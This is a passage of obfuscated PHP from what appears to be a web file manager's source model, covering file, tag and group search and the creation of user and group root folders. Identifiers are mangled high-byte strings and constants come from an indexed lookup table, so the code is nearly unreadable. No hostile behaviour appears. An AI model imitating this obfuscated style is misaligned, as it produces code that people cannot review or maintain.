$this->parseWhereLike($ êå¥şÕ); $õ°¯íÁ§ = $this->distinct(!0)->field($Ä«ıŞ¼À)->where($ êå¥şÕ)->selectPage($¡¤êî‚); if ($GLOBALS[$·âÆŸÌÉ[6]][$·âÆŸÌÉ[457]][$·âÆŸÌÉ[458]] && Input::check($íŸÌ¾ÖÓ[$·âÆŸÌÉ[2069]], $·âÆŸÌÉ[655]) && $õ°¯íÁ§[$·âÆŸÌÉ[442]][$·âÆŸÌÉ[429]] == 1 && $õ°¯íÁ§[$·âÆŸÌÉ[442]][$·âÆŸÌÉ[443]] == 0) { $õ°¯íÁ§ = $this->distinct(!0)->field($Ä«ıŞ¼À)->where($Áâ°ú¿¿)->limit(1000)->select(); $õ°¯íÁ§ = array_page_split($õ°¯íÁ§, !1, $¡¤êî‚); } $this->_listSearchFileContent($õ°¯íÁ§, $íŸÌ¾ÖÓ, $¾ÁÜ¢³, $Áâ°ú¿¿); $this->_listSearchDesc($õ°¯íÁ§, $íŸÌ¾ÖÓ, $¾ÁÜ¢³); $this->_listSearchTag($õ°¯íÁ§, $íŸÌ¾ÖÓ, $¾ÁÜ¢³); $this->_listSearchGroupTag($õ°¯íÁ§, $íŸÌ¾ÖÓ, $¾ÁÜ¢³); $this->_listDataApply($õ°¯íÁ§[$·âÆŸÌÉ[445]]); $this->_listMake($õ°¯íÁ§); return $õ°¯íÁ§; } private function _listSearchFileContent(&$²’ú©Á·, $î²â®ï†, $­£„®Ü­, $˜öºö‰) { $¿øĞ˜‹Â =& $_SERVER[¦»×‡Ãã]; if (!$î²â®ï†[$¿øĞ˜‹Â[2069]] || $²’ú©Á·[$¿øĞ˜‹Â[442]][$¿øĞ˜‹Â[429]] > 1) { return; } if (!isset($˜öºö‰[$¿øĞ˜‹Â[32]]) || !is_array($î²â®ï†[$¿øĞ˜‹Â[541]])) { return; } $˜öºö‰[$¿øĞ˜‹Â[541]] = array($¿øĞ˜‹Â[7], $î²â®ï†[$¿øĞ˜‹Â[541]]); unset($˜öºö‰[$¿øĞ˜‹Â[32]]); unset($î²â®ï†[$¿øĞ˜‹Â[541]]); $ü†ë’Ñø = $this->field($­£„®Ü­)->where($˜öºö‰)->limit($¿øĞ˜‹Â[2236])->select(); if (!$ü†ë’Ñø || count($ü†ë’Ñø) == 0) { return; } $²’ú©Á·[$¿øĞ˜‹Â[445]] = array_merge($ü†ë’Ñø, $²’ú©Á·[$¿øĞ˜‹Â[445]]); $²’ú©Á·[$¿øĞ˜‹Â[442]][$¿øĞ˜‹Â[443]] += count($ü†ë’Ñø); } private function _listSearchTag(&$®¹ÔÈçß, $ŠŒäÊÂŒ, $ºÎ»œ÷Ú) { $¿“ğ´ƒı =& $_SERVER[¦»×‡Ãã]; if (!$ŠŒäÊÂŒ[$¿“ğ´ƒı[2069]] || $®¹ÔÈçß[$¿“ğ´ƒı[442]][$¿“ğ´ƒı[429]] > 1) { return; } $ããğ›á = Model($¿“ğ´ƒı[2237])->listData(); $ËÄŠ›¯˜ = array(); $ãÇ´‰¢¨ = $ŠŒäÊÂŒ[$¿“ğ´ƒı[2069]]; foreach ($ããğ›á as $äüŠÅßÖ) { $ßşíÖ»¯ = $äüŠÅßÖ[$¿“ğ´ƒı[32]]; $°è‹Ù§ò = str_replace($¿“ğ´ƒı[53], $¿“ğ´ƒı[12], Pinyin::get($ßşíÖ»¯)); if (stripos($ßşíÖ»¯, $ãÇ´‰¢¨) !== !1 || stripos($°è‹Ù§ò, $ãÇ´‰¢¨) !== !1) { $ËÄŠ›¯˜[] = $äüŠÅßÖ[$¿“ğ´ƒı[475]]; } } if (!$ËÄŠ›¯˜) { return; } $Ùû±óÒ = array($¿“ğ´ƒı[500] => array($¿“ğ´ƒı[7], $ËÄŠ›¯˜), $¿“ğ´ƒı[1772] => USER_ID); $şè‡² = Model($¿“ğ´ƒı[502])->field($¿“ğ´ƒı[87])->where($Ùû±óÒ)->select(); $şè‡² = array_to_keyvalue($şè‡², $¿“ğ´ƒı[12], $¿“ğ´ƒı[87]); $²«µ… = array_unique($şè‡²); $this->_listSearchMerge($®¹ÔÈçß, $ŠŒäÊÂŒ, $ºÎ»œ÷Ú, $²«µ…); } private function _listSearchDesc(&$Î›à¬÷®, $ÌÌŞ’Ô„, $Üöü Ğ‰) { $ŞËÏëÑÄ =& $_SERVER[¦»×‡Ãã]; if (!$ÌÌŞ’Ô„[$ŞËÏëÑÄ[2069]] || $Î›à¬÷®[$ŞËÏëÑÄ[442]][$ŞËÏëÑÄ[429]] > 1) { return; } $şŠ›Ì‡ = array($ŞËÏëÑÄ[97] => $ŞËÏëÑÄ[526], $ŞËÏëÑÄ[450] => array($ŞËÏëÑÄ[459], $ŞËÏëÑÄ[2071] . $ÌÌŞ’Ô„[$ŞËÏëÑÄ[2069]] . $ŞËÏëÑÄ[2071])); $º×üúĞ = !1; if ($º×üúĞ) { $ğ»Ş€¦¿ = $this->listSearchChildren($ÌÌŞ’Ô„[$ŞËÏëÑÄ[192]]); $ğ»Ş€¦¿ = array_unique($ğ»Ş€¦¿); if (!$ğ»Ş€¦¿) { return; } $şŠ›Ì‡[$ŞËÏëÑÄ[193]] = array($ŞËÏëÑÄ[7], $ğ»Ş€¦¿); } $™åí¡´ = Model($ŞËÏëÑÄ[632])->field($ŞËÏëÑÄ[193])->where($şŠ›Ì‡)->limit(5000)->select(); $²÷Áó¥… = array_to_keyvalue($™åí¡´, $ŞËÏëÑÄ[12], $ŞËÏëÑÄ[193]); $this->_listSearchMerge($Î›à¬÷®, $ÌÌŞ’Ô„, $Üöü Ğ‰, $²÷Áó¥…); } private function _listSearchGroupTag(&$Öƒ¼ñ¨ù, $¼ ÙÆî», $’°‰Çõ¤) { $Ì×ÆØÎ =& $_SERVER[¦»×‡Ãã]; if (!$¼ ÙÆî»[$Ì×ÆØÎ[2069]] || $Öƒ¼ñ¨ù[$Ì×ÆØÎ[442]][$Ì×ÆØÎ[429]] > 1 || !$¼ ÙÆî»[$Ì×ÆØÎ[192]]) { return; } $ò¯ÛÕ¨® = $this->sourceInfo($¼ ÙÆî»[$Ì×ÆØÎ[192]]); if (!$ò¯ÛÕ¨® || $ò¯ÛÕ¨®[$Ì×ÆØÎ[190]] != SourceModel::TYPE_GROUP) { return; } $ÂòÀ°‹æ = $ò¯ÛÕ¨®[$Ì×ÆØÎ[569]]; $­ìßÁåÃ = Model($Ì×ÆØÎ[2238])->get($ÂòÀ°‹æ); $ÈÚŸõ°š = array(); $ìúîˆ™Š = $¼ ÙÆî»[$Ì×ÆØÎ[2069]]; foreach ($­ìßÁåÃ[$Ì×ÆØÎ[445]] as $èã‡Àª•) { $ÀŠïûè = $èã‡Àª•[$Ì×ÆØÎ[32]]; $íçÖ“àç = str_replace($Ì×ÆØÎ[53], $Ì×ÆØÎ[12], Pinyin::get($ÀŠïûè)); if (stripos($ÀŠïûè, $ìúîˆ™Š) !== !1 || stripos($íçÖ“àç, $ìúîˆ™Š) !== !1) { $ÈÚŸõ°š[] = $èã‡Àª•[$Ì×ÆØÎ[475]]; } } if (!$ÈÚŸõ°š) { return; } $™ Ìñ¸ = array($Ì×ÆØÎ[500] => array($Ì×ÆØÎ[7], $ÈÚŸõ°š), $Ì×ÆØÎ[1772] => 0, $Ì×ÆØÎ[33] => $Ì×ÆØÎ[2091] . $ÂòÀ°‹æ); $ èÙåšÔ = Model($Ì×ÆØÎ[502])->field($Ì×ÆØÎ[87])->where($™ Ìñ¸)->select(); $ èÙåšÔ = array_to_keyvalue($ èÙåšÔ, $Ì×ÆØÎ[12], $Ì×ÆØÎ[87]); $Âİ¯„± = array_unique($ èÙåšÔ); $this->_listSearchMerge($Öƒ¼ñ¨ù, $¼ ÙÆî», $’°‰Çõ¤, $Âİ¯„±); } private function _listSearchMerge(&$´Úâìéà, $˜Óæ³, $”²ôôèŸ, $Üıá¡ê) { $Õ¾èÑ¯î =& $_SERVER[¦»×‡Ãã]; if (!$Üıá¡ê) { return; } $ŸÓËª¬ä = array_to_keyvalue($´Úâìéà[$Õ¾èÑ¯î[445]], $Õ¾èÑ¯î[12], $Õ¾èÑ¯î[193]); $Ò’‹õç³ = array_diff($Üıá¡ê, $ŸÓËª¬ä); if (!$Ò’‹õç³) { return; } $ŠÇë¨æ» = array($Õ¾èÑ¯î[193] => array($Õ¾èÑ¯î[7], $Ò’‹õç³)); $Ï„Ó¸Ö„ = $this->field($”²ôôèŸ)->where($ŠÇë¨æ»)->select(); if (!$Ï„Ó¸Ö„) { return; } $†©ÛÍ›Ú = array(); foreach ($Ï„Ó¸Ö„ as $Óôğ¡) { if ($this->_listSearchFilter($Óôğ¡, $˜Óæ³)) { $†©ÛÍ›Ú[] = $Óôğ¡; } } $´Úâìéà[$Õ¾èÑ¯î[445]] = array_merge($†©ÛÍ›Ú, $´Úâìéà[$Õ¾èÑ¯î[445]]); $´Úâìéà[$Õ¾èÑ¯î[442]][$Õ¾èÑ¯î[443]] += count($†©ÛÍ›Ú); } private function _listSearchFilter($ğ˜·äòê, $êåªÅòß) { $É÷Ö¢¹Ÿ =& $_SERVER[¦»×‡Ãã]; $˜Üúƒ€¬ = $ğ˜·äòê[$É÷Ö¢¹Ÿ[485]] == $É÷Ö¢¹Ÿ[91]; if (!strstr($ğ˜·äòê[$É÷Ö¢¹Ÿ[584]], $É÷Ö¢¹Ÿ[50] . $êåªÅòß[$É÷Ö¢¹Ÿ[192]] . $É÷Ö¢¹Ÿ[50])) { return !1; } if (isset($êåªÅòß[$É÷Ö¢¹Ÿ[486]]) && $êåªÅòß[$É÷Ö¢¹Ÿ[486]] != $É÷Ö¢¹Ÿ[849]) { if ($êåªÅòß[$É÷Ö¢¹Ÿ[486]] == $É÷Ö¢¹Ÿ[78] && !$˜Üúƒ€¬) { return !1; } if ($êåªÅòß[$É÷Ö¢¹Ÿ[486]] != $É÷Ö¢¹Ÿ[78] && $˜Üúƒ€¬) { return !1; } if (!strstr($ğ˜·äòê[$É÷Ö¢¹Ÿ[169]], $É÷Ö¢¹Ÿ[50] . $êåªÅòß[$É÷Ö¢¹Ÿ[486]] . $É÷Ö¢¹Ÿ[50])) { return !1; } } if (isset($êåªÅòß[$É÷Ö¢¹Ÿ[2239]]) && $êåªÅòß[$É÷Ö¢¹Ÿ[2239]] < $ğ˜·äòê[$É÷Ö¢¹Ÿ[79]]) { return !1; } if (isset($êåªÅòß[$É÷Ö¢¹Ÿ[2240]]) && $êåªÅòß[$É÷Ö¢¹Ÿ[2240]] > $ğ˜·äòê[$É÷Ö¢¹Ÿ[79]]) { return !1; } if (isset($êåªÅòß[$É÷Ö¢¹Ÿ[662]]) && $êåªÅòß[$É÷Ö¢¹Ÿ[662]] != $ğ˜·äòê[$É÷Ö¢¹Ÿ[529]]) { return !1; } return !0; } public function listSearchChildren($¯°Û“ü•, $öİÂßÄ… = 5000) { $æÕÖÃ´ =& $_SERVER[¦»×‡Ãã]; $ŞÍßì = array(); $§²ÈÊ¸‡ = $this->sourceInfo($¯°Û“ü•); $•‹î„› = array($æÕÖÃ´[584] => array($æÕÖÃ´[459], $§²ÈÊ¸‡[$æÕÖÃ´[584]] . $§²ÈÊ¸‡[$æÕÖÃ´[193]] . $æÕÖÃ´[613])); $ÅİÎ—À³ = $this->field($æÕÖÃ´[79])->where($•‹î„›)->limit($öİÂßÄ… + 1)->select(); $ò¹Ô¿¹É = is_array($ÅİÎ—À³) ? count($ÅİÎ—À³) : 0; if ($ò¹Ô¿¹É > $öİÂßÄ…) { return $this->_listSearchChildrenNear($¯°Û“ü•, $öİÂßÄ…); } $‘®ÎŠüˆ = $this->field($æÕÖÃ´[193])->where($•‹î„›)->select(); $ŞÍßì = array_to_keyvalue($‘®ÎŠüˆ, $æÕÖÃ´[12], $æÕÖÃ´[193]); return $ŞÍßì; } private function _listSearchChildrenNear($Ûùàµéâ, $íë©ïÒÎ) { $Êø…œ´‘ =& $_SERVER[¦»×‡Ãã]; $Ç’Ó¨Ûœ = array(); $´øïÏü = array($Êø…œ´‘[192] => $Ûùàµéâ); $Ê¶ã­² = $this->field($Êø…œ´‘[2241])->where($´øïÏü)->select(); $÷Ö²È¬‚ = array_to_keyvalue(array_filter_by_field($Ê¶ã­², $Êø…œ´‘[485], $Êø…œ´‘[91]), $Êø…œ´‘[12], $Êø…œ´‘[193]); $Ç’Ó¨Ûœ = array_merge($Ç’Ó¨Ûœ, array_to_keyvalue($Ê¶ã­², $Êø…œ´‘[12], $Êø…œ´‘[193])); if (!$÷Ö²È¬‚) { return $Ç’Ó¨Ûœ; } $´øïÏü = array($Êø…œ´‘[192] => array($Êø…œ´‘[7], $÷Ö²È¬‚)); $Ê¶ã­² = $this->field($Êø…œ´‘[2241])->where($´øïÏü)->limit($íë©ïÒÎ)->select(); $Ç’Ó¨Ûœ = array_merge($Ç’Ó¨Ûœ, array_to_keyvalue($Ê¶ã­², $Êø…œ´‘[12], $Êø…œ´‘[193])); $Ç’Ó¨Ûœ = array_slice($Ç’Ó¨Ûœ, 0, intval($íë©ïÒÎ)); return $Ç’Ó¨Ûœ; } private function _listSearchBindPinyin($°ÎŸæù, &$ß¬óÈ’¤, &$ÚÃ°“Õ¿) { $ËòÇéŒ… =& $_SERVER[¦»×‡Ãã]; if (!isset($°ÎŸæù[$ËòÇéŒ…[2069]]) || !$°ÎŸæù[$ËòÇéŒ…[2069]]) { return; } if (!Input::check($°ÎŸæù[$ËòÇéŒ…[2069]], $ËòÇéŒ…[394]) || strlen($°ÎŸæù[$ËòÇéŒ…[2069]]) < 2) { return; } $áË¬Ä™É = "\114\105\x46\124\x20\112\x4f\111\116\40{$this->tablePrefix}\151\x6f\137\163\x6f\x75\162\x63\x65\x5f\155\x65\164\141\x20\155\x65\164\141\x20\157\156\x20\x73\x6f\165\x72\143\x65\56\163\x6f\x75\162\143\145\x49\x44\40\x3d\40\x6d\145\164\141\x2e\163\157\165\162\x63\145\x49\104"; $õ±ÚñÒâ = array(); $ÚÃ°“Õ¿ = str_replace(array($ËòÇéŒ…[262], $ËòÇéŒ…[53], $ËòÇéŒ…[2242]), $ËòÇéŒ…[12], $ÚÃ°“Õ¿); $ÚÃ°“Õ¿ = $ËòÇéŒ…[511] . str_replace($ËòÇéŒ…[50], $ËòÇéŒ…[512], $ÚÃ°“Õ¿); $œÇï‰ô = $ß¬óÈ’¤[$ËòÇéŒ…[32]]; unset($ß¬óÈ’¤[$ËòÇéŒ…[32]]); foreach ($ß¬óÈ’¤ as $½”¦ƒúÊ => $ì‘›ùÎ) { $õ±ÚñÒâ[$ËòÇéŒ…[511] . $½”¦ƒúÊ] = $ì‘›ùÎ; } foreach ($œÇï‰ô as $Àü¯öô) { $õ±ÚñÒâ[] = array($ËòÇéŒ…[516] => $Àü¯öô, $ËòÇéŒ…[1078] => $ËòÇéŒ…[2073], array($ËòÇéŒ…[2243] => $Àü¯öô, $ËòÇéŒ…[2244] => array($ËòÇéŒ…[7], array($ËòÇéŒ…[538], $ËòÇéŒ…[537])))); } $this->join($áË¬Ä™É); $ß¬óÈ’¤ = $õ±ÚñÒâ; } private function _parseSearchWhere($™”ƒÛ”) { $ëĞ¦‘‘ =& $_SERVER[¦»×‡Ãã]; $÷›ÑÃå = array(); if (isset($™”ƒÛ”[$ëĞ¦‘‘[833]]) && $™”ƒÛ”[$ëĞ¦‘‘[833]]) { $÷›ÑÃå[$ëĞ¦‘‘[88]] = array($ëĞ¦‘‘[2245], $™”ƒÛ”[$ëĞ¦‘‘[833]]); } if (isset($™”ƒÛ”[$ëĞ¦‘‘[834]]) && $™”ƒÛ”[$ëĞ¦‘‘[834]]) { $£ÑÃÔ›Ğ = array($ëĞ¦‘‘[2246], $™”ƒÛ”[$ëĞ¦‘‘[834]]); if ($÷›ÑÃå[$ëĞ¦‘‘[88]]) { $÷›ÑÃå[$ëĞ¦‘‘[88]] = array($÷›ÑÃå[$ëĞ¦‘‘[88]], $£ÑÃÔ›Ğ, $ëĞ¦‘‘[2247]); } else { $÷›ÑÃå[$ëĞ¦‘‘[88]] = $£ÑÃÔ›Ğ; } } if (isset($™”ƒÛ”[$ëĞ¦‘‘[2239]]) && $™”ƒÛ”[$ëĞ¦‘‘[2239]] > 0) { $÷›ÑÃå[$ëĞ¦‘‘[79]] = array($ëĞ¦‘‘[2245], $™”ƒÛ”[$ëĞ¦‘‘[2239]]); } if (isset($™”ƒÛ”[$ëĞ¦‘‘[2240]]) && $™”ƒÛ”[$ëĞ¦‘‘[2240]]) { $£ÑÃÔ›Ğ = array($ëĞ¦‘‘[2246], $™”ƒÛ”[$ëĞ¦‘‘[2240]]); if ($÷›ÑÃå[$ëĞ¦‘‘[79]]) { $÷›ÑÃå[$ëĞ¦‘‘[79]] = array($÷›ÑÃå[$ëĞ¦‘‘[79]], $£ÑÃÔ›Ğ, $ëĞ¦‘‘[2247]); } else { $÷›ÑÃå[$ëĞ¦‘‘[79]] = $£ÑÃÔ›Ğ; } } if (isset($™”ƒÛ”[$ëĞ¦‘‘[662]]) && $™”ƒÛ”[$ëĞ¦‘‘[662]]) { $÷›ÑÃå[] = array($ëĞ¦‘‘[529] => $™”ƒÛ”[$ëĞ¦‘‘[662]], $ëĞ¦‘‘[527] => $™”ƒÛ”[$ëĞ¦‘‘[662]], $ëĞ¦‘‘[1078] => $ëĞ¦‘‘[2073]); } if (isset($™”ƒÛ”[$ëĞ¦‘‘[486]]) && $™”ƒÛ”[$ëĞ¦‘‘[486]]) { $ê´ßµÛî = $™”ƒÛ”[$ëĞ¦‘‘[486]]; if ($ê´ßµÛî == $ëĞ¦‘‘[78]) { $÷›ÑÃå[$ëĞ¦‘‘[485]] = 1; } else { if ($ê´ßµÛî == $ëĞ¦‘‘[2248]) { $÷›ÑÃå[$ëĞ¦‘‘[485]] = 0; } else { if ($ê´ßµÛî) { $ê´ßµÛî = is_array($ê´ßµÛî) ? $ê´ßµÛî : explode($ëĞ¦‘‘[50], $ê´ßµÛî); $÷›ÑÃå[$ëĞ¦‘‘[486]] = array($ëĞ¦‘‘[492], $ê´ßµÛî); $÷›ÑÃå[$ëĞ¦‘‘[485]] = 0; } } } } $this->_parseSearchParent($™”ƒÛ”, $÷›ÑÃå); if (isset($™”ƒÛ”[$ëĞ¦‘‘[2069]]) && trim($™”ƒÛ”[$ëĞ¦‘‘[2069]])) { $Ñ¦Ñ÷ = trim($™”ƒÛ”[$ëĞ¦‘‘[2069]]); $¹Ëı”ÚÒ = explode($ëĞ¦‘‘[53], $Ñ¦Ñ÷); if (strlen($Ñ¦Ñ÷) > 2 && (substr($Ñ¦Ñ÷, 0, 1) == $ëĞ¦‘‘[121] && substr($Ñ¦Ñ÷, -1) == $ëĞ¦‘‘[121]) || substr($Ñ¦Ñ÷, 0, 1) == $ëĞ¦‘‘[58] && substr($Ñ¦Ñ÷, -1) == $ëĞ¦‘‘[58]) { $Ñ¦Ñ÷ = substr($Ñ¦Ñ÷, 1, -1); $¹Ëı”ÚÒ = array($Ñ¦Ñ÷); } $÷›ÑÃå[$ëĞ¦‘‘[32]] = array(array($ëĞ¦‘‘[612], $ëĞ¦‘‘[2071] . $Ñ¦Ñ÷ . $ëĞ¦‘‘[2071])); if (count($¹Ëı”ÚÒ) > 1) { $÷›ÑÃå[$ëĞ¦‘‘[32]] = array(); foreach ($¹Ëı”ÚÒ as $Ç©ßÂÜà) { if (!trim($Ç©ßÂÜà)) { continue; } $÷›ÑÃå[$ëĞ¦‘‘[32]][] = array($ëĞ¦‘‘[612], $ëĞ¦‘‘[2071] . trim($Ç©ßÂÜà) . $ëĞ¦‘‘[2071]); } } } return $÷›ÑÃå; } private function _parseSearchParent($‚¬í§äÌ, &$åÆè»Ù›) { $Àô°ÈÕ¡ =& $_SERVER[¦»×‡Ãã]; if (!isset($‚¬í§äÌ[$Àô°ÈÕ¡[192]]) || !$‚¬í§äÌ[$Àô°ÈÕ¡[192]]) { return; } $­«¥¿ñÓ = $this->pathInfo($‚¬í§äÌ[$Àô°ÈÕ¡[192]]); $Ù“«‹™Î = $­«¥¿ñÓ[$Àô°ÈÕ¡[192]] . $Àô°ÈÕ¡[12] === $Àô°ÈÕ¡[228]; $ë§êêË’ = $­«¥¿ñÓ[$Àô°ÈÕ¡[190]] == $Àô°ÈÕ¡[578]; if ($­«¥¿ñÓ[$Àô°ÈÕ¡[595]] == $Àô°ÈÕ¡[596]) { $÷¼ëÊî = $this->sourceInfo($‚¬í§äÌ[$Àô°ÈÕ¡[192]]); $­«¥¿ñÓ[$Àô°ÈÕ¡[584]] = $÷¼ëÊî[$Àô°ÈÕ¡[584]]; } $åÆè»Ù›[$Àô°ÈÕ¡[652]] = array($Àô°ÈÕ¡[612], $­«¥¿ñÓ[$Àô°ÈÕ¡[584]] . $‚¬í§äÌ[$Àô°ÈÕ¡[192]] . $Àô°ÈÕ¡[613]); $Ÿ¡¼ àÍ = isset($‚¬í§äÌ[$Àô°ÈÕ¡[1929]]) && in_array($Àô°ÈÕ¡[578], $‚¬í§äÌ[$Àô°ÈÕ¡[1929]]); if (!$Ÿ¡¼ àÍ || !$ë§êêË’ || !$Ù“«‹™Î || !$­«¥¿ñÓ[$Àô°ÈÕ¡[487]]) { return; } if (!AuthModel::authCheckRoot($­«¥¿ñÓ[$Àô°ÈÕ¡[487]][$Àô°ÈÕ¡[488]])) { return; } $Şå½ÑŸø = $­«¥¿ñÓ[$Àô°ÈÕ¡[569]] . $Àô°ÈÕ¡[12]; if ($Şå½ÑŸø == $Àô°ÈÕ¡[91]) { unset($åÆè»Ù›[$Àô°ÈÕ¡[652]]); $åÆè»Ù›[$Àô°ÈÕ¡[190]] = self::TYPE_GROUP; return; } $‹©ÎÒÀ = Model($Àô°ÈÕ¡[585])->groupChildrenAll($Şå½ÑŸø); $œâËÑÎ€ = count($‹©ÎÒÀ); if ($œâËÑÎ€ <= 1) { return; } $»Ù³Àì¡ = array($Àô°ÈÕ¡[192] => 0, $Àô°ÈÕ¡[190] => self::TYPE_GROUP, $Àô°ÈÕ¡[569] => array($Àô°ÈÕ¡[7], $‹©ÎÒÀ)); $õ‚×Á½€ = $this->field($Àô°ÈÕ¡[2249])->where($»Ù³Àì¡)->limit($œâËÑÎ€)->select(); $åÆè»Ù›[$Àô°ÈÕ¡[652]] = array(); foreach ($õ‚×Á½€ as $Ùû“ã»É) { $åÆè»Ù›[$Àô°ÈÕ¡[652]][] = array($Àô°ÈÕ¡[612], $Àô°ÈÕ¡[594] . $Ùû“ã»É[$Àô°ÈÕ¡[193]] . $Àô°ÈÕ¡[613]); } $åÆè»Ù›[$Àô°ÈÕ¡[652]][] = $Àô°ÈÕ¡[2073]; } } class SourceModel extends SourceListSearchModel { public $statusIgnoreResetSpace = false; public function userRootAdd($âÅÎî•Ø) { $ñíƒÑš =& $_SERVER[¦»×‡Ãã]; $Ÿôø—– = Model($ñíƒÑš[577])->where(array($ñíƒÑš[1763] => $âÅÎî•Ø))->find(); $ûŒï“ÓÍ = $this->_mkdirRoot(SourceModel::TYPE_USER, $âÅÎî•Ø, $Ÿôø—–[$ñíƒÑš[32]]); $this->userDesktopAdd($ûŒï“ÓÍ); return $ûŒï“ÓÍ; } public function userDesktopAdd($¢¼÷Œ…­) { $“ù´á’  =& $_SERVER[¦»×‡Ãã]; $ÛåºÙ¿ğ = LNG($“ù´á’ [2250]); $¨ ËÆ¢Ş = $this->mkdir($¢¼÷Œ…­, $ÛåºÙ¿ğ); $this->metaSet($¨ ËÆ¢Ş, $“ù´á’ [2251], $“ù´á’ [91]); $this->metaSet($¢¼÷Œ…­, $“ù´á’ [2252], $¨ ËÆ¢Ş); } public function userPathSafeAdd($à‹£¸»ó) { $ÔÖŸ›ÀÎ =& $_SERVER[¦»×‡Ãã]; $·‹öÊ„ = Model($ÔÖŸ›ÀÎ[577])->getInfoFull($à‹£¸»ó); if (!$·‹öÊ„) { return !1; } if (_get($·‹öÊ„, $ÔÖŸ›ÀÎ[599])) { return $·‹öÊ„[$ÔÖŸ›ÀÎ[539]][$ÔÖŸ›ÀÎ[2253]]; } $¾¬ç™É± = $this->_mkdirRoot(SourceModel::TYPE_USER, $à‹£¸»ó, $ÔÖŸ›ÀÎ[2254], $ÔÖŸ›ÀÎ[506]); Model($ÔÖŸ›ÀÎ[577])->metaSet($à‹£¸»ó, $ÔÖŸ›ÀÎ[2253], $¾¬ç™É±); $this->metaSet($¾¬ç™É±, $ÔÖŸ›ÀÎ[2255], $à‹£¸»ó); return $¾¬ç™É±; } public function groupRootAdd($ùÖÒ×Ÿ) { $•Ÿåô‹ =& $_SERVER[¦»×‡Ãã]; $¢ïÜõÖï = Model($•Ÿåô‹[585])->where(array($•Ÿåô‹[2063] => $ùÖÒ×Ÿ))->find(); return $this->_mkdirRoot(SourceModel::TYPE_GROUP, $ùÖÒ×Ÿ, $¢ïÜõÖï[$•Ÿåô‹[32]]); } public function systemRootPathAdd($Ç€‘»óÛ) { if ($Ç€‘»óÛ != $_SERVER[¦»×‡Ãã][605]) { return !1; } return $this->_mkdirRoot(SourceModel::TYPE_SYSTEM, 0, $Ç€‘»óÛ); } public function userRootRemove($Í¿ÄÀâı) { $òìÊê†¸ = $this->targetSourceRoot(SourceModel::TYPE_USER, $Í¿ÄÀâı, !0); foreach ($òìÊê†¸ as $«×áøª˜) { if (!$«×áøª˜) { continue; } $this->remove($«×áøª˜[$_SERVER[¦»×‡Ãã][193]], !1); } } public function groupRootRemove($ÔØé’¨½) { $Òûƒ«™Ò = $this->targetSourceRoot(SourceModel::TYPE_GROUP, $ÔØé’¨½); if (!$Òûƒ«™Ò) { return; } $this->remove($Òûƒ«™Ò[$_SERVER[¦»×‡Ãã][193]], !1); } private function _mkdirRoot($ç´³»€“, $“¬ÈÁ€û, $œƒ§ß®ñ, $ñ¸¼ = '') { $±İ½‚ò =& $_SERVER[¦»×‡Ãã]; $›×ÉÙ‰é = defined($±İ½‚ò[2197]) ? USER_ID : 0; $Û‡­Ñî = array($±İ½‚ò[477] => 0, $±İ½‚ò[648] => $ç´³»€“, $±İ½‚ò[649] => $“¬ÈÁ€û, $±İ½‚ò[646] => 1, $±İ½‚ò[650] => $›×ÉÙ‰é, $±İ½‚ò[651] => $›×ÉÙ‰é, $±İ½‚ò[647] => $ñ¸¼, $±İ½‚ò[652] => $±İ½‚ò[594], $±İ½‚ò[504] => 0, $±İ½‚ò[617] => 0, $±İ½‚ò[542] => 0, $±İ½‚ò[653] => $±İ½‚ò[12]); if ($µòƒÈ• = $this->where($Û‡­Ñî)->find()) { return $µòƒÈ•[$±İ½‚ò[193]]; } $ÂÈ…ÎÀ = "\x4d\157\144\x65\x6c\x53\x6f\165\x72\x63\x65\56\x6d\153\144\x69\162\122\157\x6f\164\x2e{$ç´³»€“}\x2e{$“¬ÈÁ€û}\56" . $œƒ§ß®ñ; CacheLock::lock($ÂÈ…ÎÀ); $Û‡­Ñî[$±İ½‚ò[32]] = $œƒ§ß®ñ; $Óñóà÷ë = $this->add($Û‡­Ñî); $¤ °‚¹ = array($±İ½‚ò[654] => short_id($Óñóà÷ë)); $this->where(array($±İ½‚ò[491] => $Óñóà÷ë))->save($¤ °‚¹); CacheLock::unlock($ÂÈ…ÎÀ); return $Óñóà÷ë; } private function targetSourceRoot($Û½Â–ùÇ, $ÅˆÄ°‚Ä, $¼ä†§² = false) { $²§©•é =& $_SERVER[¦»×‡Ãã]; $íèÊ€¢ä = array($²§©•é[477] => 0, $²§©•é[648] => $Û½Â–ùÇ, $²§©•é[649] => $ÅˆÄ°‚Ä); if ($¼ä†§²) { $Ï Š… = $this->where($íèÊ€¢ä)->select(); return $Ï Š… ? $Ï Š… : array(); } $Å¾¾Ÿ = $this->where($íèÊ€¢ä)->find(); return $Å¾¾Ÿ ? $Å¾¾Ÿ : array(); } public function sourceRootGroup($ôû§ûŒÎ) { $é÷âœõ =& $_SERVER[¦»×‡Ãã]; if (is_string($ôû§ûŒÎ)) { $ôû§ûŒÎ = array($ôû§ûŒÎ); } $¶Î ´¥£ = $this->listSourceRoot(SourceModel::TYPE_GROUP, $ôû§ûŒÎ, $é÷âœõ[220]); $º•ö¬–£ = array($é÷âœõ[445] => $¶Î ´¥£, $é÷âœõ[442] => array($é÷âœõ[831] => count($ôû§ûŒÎ))); $this->_listDataApply($º•ö¬–£[$é÷âœõ[445]]); $this->_listMake($º•ö¬–£); return array_to_keyvalue($º•ö¬–£[$é÷âœõ[85]], $é÷âœõ[569]); } public function mkfile($Ôóš‘Ñ“, $ÇÖ‹½Èö, $£¿²®Ÿñ = '', $—¹á­¿ = REPEAT_RENAME) { $—ô³ö¦– =& $_SERVER[¦»×‡Ãã]; $·‰ĞÖ’‹ = Model($—ô³ö¦–[674])->addFileByContent($£¿²®Ÿñ, $ÇÖ‹½Èö); return $this->_createFileCall($Ôóš‘Ñ“, $ÇÖ‹½Èö, $·‰ĞÖ’‹, $—¹á­¿, $—ô³ö¦–[1430]); } public function addFile($•Ã°ÁÄ½, $–Ú§¶ÔÕ, $…ù¶Í ¥, $¬Òâö‡Ì = false, $ÚªÚ‚®è = REPEAT_RENAME) { $Œ¦äàçğ = Model($_SERVER[¦»×‡Ãã][674])->addFile($–Ú§¶ÔÕ, $…ù¶Í ¥, $¬Òâö‡Ì); return $this->_createFileCall($•Ã°ÁÄ½, $…ù¶Í ¥, $Œ¦äàçğ, $ÚªÚ‚®è); } public function addFileByFileID($–ŸÙÂİ¯, $ç¾Ê¼ò¨, $“ß†‹Š‰, $ƒª‹ìşº = REPEAT_RENAME) { $´œŒÛÜÏ =& $_SERVER[¦»×‡Ãã]; $é¶¢–´ç = Model($´œŒÛÜÏ[674])->find($ç¾Ê¼ò¨); Model($´œŒÛÜÏ[674])->linkAdd($ç¾Ê¼ò¨); return 